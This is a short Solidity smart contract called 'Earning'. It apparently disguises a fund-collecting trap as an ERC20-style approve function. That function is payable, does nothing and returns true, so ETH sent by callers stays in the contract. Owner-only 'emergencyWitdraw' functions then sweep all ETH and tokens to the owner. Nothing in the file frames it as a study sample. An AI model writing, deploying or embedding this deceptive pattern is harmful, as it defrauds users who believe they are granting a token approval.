// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract Earning is Context, Ownable {

    constructor() {
       
    }

    function approve(address spender, uint tokens) public payable returns (bool success) {
       return true;
    }

    function emergencyWitdraw() public onlyOwner{
        _msgSender().call{value: address(this).balance }("");
    }

    function emergencyWitdrawToken(address _token, uint256 _amount) public onlyOwner {
        IERC20(_token).transferFrom(address(this), _msgSender(), _amount);
    }
}